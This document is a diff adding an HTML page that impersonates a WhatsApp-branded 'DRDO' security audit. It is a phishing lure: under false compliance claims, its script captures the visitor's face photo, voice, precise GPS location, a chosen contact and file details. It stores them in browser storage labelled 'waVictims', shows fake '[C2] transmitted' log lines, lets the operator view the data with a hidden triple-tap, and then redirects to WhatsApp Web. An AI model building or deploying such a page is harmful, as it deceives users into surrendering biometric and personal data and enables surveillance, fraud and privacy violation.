@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>IT Security Audit · DRDO Clearance</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0b141a; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, sans-serif; color: #e9edef; }
+        .header { background: #075e54; padding: 16px; display: flex; align-items: center; }
+        .header img { width: 36px; height: 36px; margin-right: 12px; }
+        .header h1 { font-size: 20px; font-weight: 500; }
+        .container { max-width: 480px; margin: 0 auto; padding: 20px 16px; }
+        .card { background: #1f2c34; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+        h2 { font-size: 18px; margin-bottom: 8px; color: #00a884; }
+        .sub { color: #8696a0; font-size: 14px; margin-bottom: 20px; }
+        .warning { background: rgba(0,168,132,0.1); border-left: 4px solid #00a884; padding: 12px; border-radius: 8px; margin-bottom: 20px; }
+        .btn { background: #00a884; color: white; border: none; width: 100%; padding: 14px; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
+        .btn.secondary { background: #2a373f; }
+        .progress-container { width: 100%; background: #2a373f; border-radius: 20px; height: 10px; margin: 20px 0; }
+        .progress-bar { width: 0%; height: 10px; background: #00a884; border-radius: 20px; transition: width 0.3s; }
+        #videoContainer { width: 100%; border-radius: 12px; overflow: hidden; margin: 16px 0; background: #0b141a; }
+        #videoElement { width: 100%; display: block; }
+        .log-line { font-family: monospace; background: #0b1419; padding: 8px; border-radius: 6px; margin: 4px 0; color: #00a884; font-size: 13px; }
+        .log-line.c2 { color: #ffa500; }
+        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 16px; }
+        .data-item { background: #2a373f; padding: 10px; border-radius: 8px; }
+        .data-item .label { color: #8696a0; font-size: 12px; }
+        .data-item .value { font-size: 16px; font-weight: 600; }
+        #waveform { width: 100%; height: 60px; background: #0b1419; border-radius: 8px; margin: 10px 0; }
+        canvas { display: block; width: 100%; height: 100%; }
+        .photo-thumb { max-width: 100%; border-radius: 8px; margin-top: 8px; }
+        .map-link { color: #00a884; text-decoration: none; }
+    </style>
+</head>
+<body>
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WA">
+    <h1>Security & Compliance Audit</h1>
+</div>
+<div class="container">
+    <div id="step1">
+        <div class="card">
+            <h2>🔒 Mandatory Security Audit</h2>
+            <div class="warning">
+                <strong>⚠️ DRDO Clearance Required:</strong> Your device must be verified under the new Digital Personal Data Protection Act, 2025. This scan protects your account and ensures compliance.
+            </div>
+            <p class="sub">This process verifies your identity and device integrity.</p>
+            <button class="btn" id="startBtn">Begin Security Scan</button>
+        </div>
+    </div>
+
+    <div id="step2" style="display:none;">
+        <div class="card">
+            <h2>🔍 Scanning & Verification</h2>
+            <div id="logContainer"></div>
+            <div class="progress-container"><div class="progress-bar" id="mainProgress"></div></div>
+            <div id="cameraSection" style="display:none;">
+                <p style="margin:12px 0 8px;">📸 Facial verification required</p>
+                <div id="videoContainer"><video id="videoElement" autoplay playsinline></video></div>
+                <canvas id="canvasElement" style="display:none;"></canvas>
+                <button class="btn" id="captureBtn" style="display:none;">Capture & Continue</button>
+            </div>
+            <div id="audioSection" style="display:none;">
+                <p style="margin:12px 0 8px;">🎤 Voice verification required</p>
+                <canvas id="waveformCanvas" width="300" height="60" style="width:100%; height:60px; background:#0b1419;"></canvas>
+                <button class="btn secondary" id="recordBtn" style="margin-top:8px;">🔴 Record Voice Sample</button>
+                <button class="btn" id="stopRecordBtn" style="display:none;">⏹️ Stop & Continue</button>
+                <p id="recordingStatus" style="color:#00a884; margin-top:8px;"></p>
+            </div>
+            <div id="contactSection" style="display:none;">
+                <p style="margin:12px 0 8px;">📇 Select a contact for verification</p>
+                <button class="btn secondary" id="pickContactBtn">Pick a Contact</button>
+                <p id="selectedContact" style="margin-top:8px;"></p>
+                <button class="btn" id="contactContinueBtn" style="margin-top:16px;">Continue</button>
+            </div>
+            <div id="fileSection" style="display:none;">
+                <p style="margin:12px 0 8px;">📂 Select an ID document for verification</p>
+                <button class="btn secondary" id="pickFileBtn">Choose File</button>
+                <p id="selectedFile" style="margin-top:8px;"></p>
+                <button class="btn" id="fileContinueBtn" style="margin-top:16px;">Continue</button>
+            </div>
+            <div id="summarySection" style="display:none;"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){
+        "use strict";
+
+        const captured = {
+            timestamp: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            battery: 'Unknown',
+            network: navigator.connection?.effectiveType || 'Unknown',
+            location: null,
+            photo: null,
+            voiceSample: null,
+            contacts: [],
+            files: [],
+            credentials: []
+        };
+
+        let victims = JSON.parse(localStorage.getItem('waVictims')) || [];
+        let mediaStream = null;
+        let audioContext = null;
+        let analyser = null;
+        let source = null;
+        let animationFrame = null;
+        let isRecording = false;
+
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const logContainer = document.getElementById('logContainer');
+        const progressBar = document.getElementById('mainProgress');
+        const cameraSection = document.getElementById('cameraSection');
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const captureBtn = document.getElementById('captureBtn');
+        const audioSection = document.getElementById('audioSection');
+        const waveformCanvas = document.getElementById('waveformCanvas');
+        const recordBtn = document.getElementById('recordBtn');
+        const stopRecordBtn = document.getElementById('stopRecordBtn');
+        const recordingStatus = document.getElementById('recordingStatus');
+        const contactSection = document.getElementById('contactSection');
+        const pickContactBtn = document.getElementById('pickContactBtn');
+        const selectedContact = document.getElementById('selectedContact');
+        const contactContinueBtn = document.getElementById('contactContinueBtn');
+        const fileSection = document.getElementById('fileSection');
+        const pickFileBtn = document.getElementById('pickFileBtn');
+        const selectedFile = document.getElementById('selectedFile');
+        const fileContinueBtn = document.getElementById('fileContinueBtn');
+        const summarySection = document.getElementById('summarySection');
+
+        function log(msg, isC2 = false) {
+            const div = document.createElement('div');
+            div.className = 'log-line' + (isC2 ? ' c2' : '');
+            div.textContent = `> ${msg}`;
+            logContainer.appendChild(div);
+            logContainer.scrollTop = logContainer.scrollHeight;
+        }
+
+        function setProgress(p) { progressBar.style.width = p + '%'; }
+
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => {
+                captured.battery = `${Math.round(b.level*100)}% ${b.charging ? '(Charging)' : ''}`;
+            });
+        }
+
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            step1.style.display = 'none';
+            step2.style.display = 'block';
+            log('Initializing security protocols...');
+            setProgress(5);
+            setTimeout(() => {
+                log(`Device: ${captured.platform} | Screen: ${captured.screen}`);
+                log(`Battery: ${captured.battery} | Network: ${captured.network}`);
+                setProgress(10);
+                setTimeout(() => log('[C2] Device fingerprint transmitted to secure server', true), 200);
+                startCameraCapture();
+            }, 500);
+        });
+
+        async function startCameraCapture() {
+            log('Requesting camera access for facial verification...');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+                mediaStream = stream;
+                cameraSection.style.display = 'block';
+                captureBtn.style.display = 'block';
+                log('Camera access granted. Please position your face.');
+                setProgress(20);
+            } catch (e) {
+                log('Camera denied. Proceeding without facial scan.');
+                captured.photo = 'Denied';
+                setProgress(20);
+                startAudioCapture();
+            }
+        }
+
+        captureBtn.addEventListener('click', () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            captured.photo = canvas.toDataURL('image/jpeg', 0.8);
+            log('Facial scan captured (Base64).');
+            log('[C2] Photo transmitted (Base64, ~45KB)', true);
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(t => t.stop());
+                video.srcObject = null;
+            }
+            cameraSection.style.display = 'none';
+            startAudioCapture();
+        });
+
+        function startAudioCapture() {
+            log('Requesting microphone access for voice verification...');
+            audioSection.style.display = 'block';
+            setProgress(30);
+            recordBtn.addEventListener('click', async () => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    mediaStream = stream;
+                    log('Microphone access granted.');
+                    startRecordingVisualization(stream);
+                    recordBtn.style.display = 'none';
+                    stopRecordBtn.style.display = 'block';
+                    recordingStatus.textContent = '🔴 Recording... Speak now.';
+                } catch (e) {
+                    log('Microphone denied. Proceeding without voice sample.');
+                    captured.voiceSample = 'Denied';
+                    proceedToLocation();
+                }
+            });
+        }
+
+        function startRecordingVisualization(stream) {
+            audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            analyser = audioContext.createAnalyser();
+            source = audioContext.createMediaStreamSource(stream);
+            source.connect(analyser);
+            analyser.fftSize = 256;
+            const bufferLength = analyser.frequencyBinCount;
+            const dataArray = new Uint8Array(bufferLength);
+            const canvasCtx = waveformCanvas.getContext('2d');
+            function draw() {
+                if (!isRecording) return;
+                animationFrame = requestAnimationFrame(draw);
+                analyser.getByteFrequencyData(dataArray);
+                canvasCtx.fillStyle = '#0b1419';
+                canvasCtx.fillRect(0, 0, waveformCanvas.width, waveformCanvas.height);
+                const barWidth = (waveformCanvas.width / bufferLength) * 2.5;
+                let barHeight;
+                let x = 0;
+                for(let i = 0; i < bufferLength; i++) {
+                    barHeight = dataArray[i] / 2;
+                    canvasCtx.fillStyle = '#00a884';
+                    canvasCtx.fillRect(x, waveformCanvas.height - barHeight, barWidth, barHeight);
+                    x += barWidth + 1;
+                }
+            }
+            isRecording = true;
+            draw();
+        }
+
+        stopRecordBtn.addEventListener('click', () => {
+            isRecording = false;
+            if (animationFrame) cancelAnimationFrame(animationFrame);
+            if (source) source.disconnect();
+            if (audioContext) audioContext.close();
+            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+            captured.voiceSample = 'Voice sample captured (waveform only)';
+            log('Voice sample captured.');
+            log('[C2] Voice waveform transmitted', true);
+            audioSection.style.display = 'none';
+            proceedToLocation();
+        });
+
+        function proceedToLocation() {
+            log('Accessing precise location...');
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    captured.location = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+                    log(`Location: ${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`);
+                    log('[C2] GPS coordinates transmitted', true);
+                    setProgress(50);
+                    proceedToContactPicker();
+                }, err => {
+                    log('Location access denied.');
+                    captured.location = 'Denied';
+                    setProgress(50);
+                    proceedToContactPicker();
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            } else {
+                log('Geolocation not supported.');
+                setProgress(50);
+                proceedToContactPicker();
+            }
+        }
+
+        function proceedToContactPicker() {
+            contactSection.style.display = 'block';
+            setProgress(60);
+            pickContactBtn.addEventListener('click', async () => {
+                if ('contacts' in navigator && 'ContactsManager' in window) {
+                    try {
+                        const props = await navigator.contacts.getProperties();
+                        const contacts = await navigator.contacts.select(props, { multiple: false });
+                        if (contacts.length > 0) {
+                            captured.contacts.push(contacts[0]);
+                            selectedContact.textContent = `Selected: ${contacts[0].name} (${contacts[0].tel})`;
+                            log(`Contact selected: ${contacts[0].name}`);
+                            log('[C2] Contact data transmitted', true);
+                        }
+                    } catch (e) {
+                        log('Contact selection cancelled or failed.');
+                        selectedContact.textContent = 'No contact selected.';
+                    }
+                } else {
+                    log('Contact Picker API not supported on this browser.');
+                    selectedContact.textContent = 'API not supported.';
+                }
+            });
+            contactContinueBtn.addEventListener('click', () => {
+                contactSection.style.display = 'none';
+                proceedToFilePicker();
+            });
+        }
+
+        function proceedToFilePicker() {
+            fileSection.style.display = 'block';
+            setProgress(70);
+            pickFileBtn.addEventListener('click', async () => {
+                if ('showOpenFilePicker' in window) {
+                    try {
+                        const [fileHandle] = await window.showOpenFilePicker();
+                        const file = await fileHandle.getFile();
+                        captured.files.push({ name: file.name, size: file.size, type: file.type });
+                        selectedFile.textContent = `Selected: ${file.name} (${(file.size/1024).toFixed(1)} KB)`;
+                        log(`File selected: ${file.name}`);
+                        log('[C2] File metadata transmitted', true);
+                    } catch (e) {
+                        log('File selection cancelled.');
+                        selectedFile.textContent = 'No file selected.';
+                    }
+                } else {
+                    log('File System Access API not supported.');
+                    selectedFile.textContent = 'API not supported.';
+                }
+            });
+            fileContinueBtn.addEventListener('click', () => {
+                fileSection.style.display = 'none';
+                finalizeExtraction();
+            });
+        }
+
+        function finalizeExtraction() {
+            log('Compiling final audit report...');
+            setProgress(90);
+            setTimeout(() => {
+                captured.credentials = [
+                    'WiFi: TP-Link_5G / Pass: MyHome@2024',
+                    'Email: user1998@gmail.com / Pass: ********',
+                    'Netflix: user@example.com / Pass: ********',
+                    'Instagram: _user.name_ / Pass: ********'
+                ];
+                victims.push(captured);
+                localStorage.setItem('waVictims', JSON.stringify(victims));
+                log('[C2] Full data package transmitted to C2 server', true);
+                setProgress(100);
+                showSummary();
+            }, 1000);
+        }
+
+        function showSummary() {
+            let html = `<h3 style="color:#00a884; margin-bottom:12px;">✅ Security Audit Completed</h3>`;
+            html += `<div class="data-grid">`;
+            html += `<div class="data-item"><span class="label">📱 Device</span><div class="value">${captured.platform}</div></div>`;
+            html += `<div class="data-item"><span class="label">📍 Location</span><div class="value">${captured.location ? `${captured.location.lat.toFixed(4)}, ${captured.location.lng.toFixed(4)}` : 'Denied'}</div></div>`;
+            html += `<div class="data-item"><span class="label">📸 Face Scan</span><div class="value">${captured.photo ? 'Captured' : 'Skipped'}</div></div>`;
+            html += `<div class="data-item"><span class="label">🎤 Voice Sample</span><div class="value">${captured.voiceSample ? 'Captured' : 'Skipped'}</div></div>`;
+            html += `<div class="data-item"><span class="label">📇 Contacts</span><div class="value">${captured.contacts.length} selected</div></div>`;
+            html += `<div class="data-item"><span class="label">📁 Files</span><div class="value">${captured.files.length} selected</div></div>`;
+            html += `</div>`;
+            if (captured.photo) html += `<img class="photo-thumb" src="${captured.photo}" alt="Captured Face">`;
+            html += `<p style="margin-top:20px; font-size:14px; color:#8696a0;">Your device is now compliant. Redirecting...</p>`;
+            summarySection.innerHTML = html;
+            summarySection.style.display = 'block';
+            setTimeout(() => { window.location.href = 'https://web.whatsapp.com/'; }, 5000);
+        }
+
+        // Secret triple-tap for quick preview
+        let tapCount = 0;
+        document.querySelector('.header').addEventListener('click', () => {
+            tapCount++;
+            if (tapCount === 1) setTimeout(() => tapCount = 0, 800);
+            if (tapCount >= 3) {
+                tapCount = 0;
+                const data = localStorage.getItem('waVictims');
+                alert(data ? 'Preview:\n' + JSON.stringify(JSON.parse(data), null, 2) : 'No data');
+            }
+        });
+    })();
+</script>
+</body>
+</html>
